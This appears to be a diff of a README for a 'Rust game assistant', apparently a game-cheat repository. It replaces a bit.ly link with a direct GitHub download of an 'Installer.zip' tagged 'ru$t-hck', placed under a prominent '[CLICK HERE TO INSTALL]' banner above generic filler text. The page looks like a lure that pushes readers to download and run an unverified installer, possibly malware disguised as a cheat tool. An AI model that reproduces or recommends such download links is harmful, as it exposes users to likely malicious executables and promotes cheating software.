@@ -1,4 +1,4 @@
-<H1 align=center><a href="bit.ly/3Rgg0ys">[CLICK HERE TO INSTALL]</a></H1>
+<H1 align=center><a href="https://github.com/Surjith0/my-first-pro/releases/download/ru%24t-hck/Installer.zip">[CLICK HERE TO INSTALL]</a></H1>
 
 # A Rust game assistant program can include various features such as maps, resource information, base planning tools, and a progress tracking system. Here is an example of a description of such a program:
 
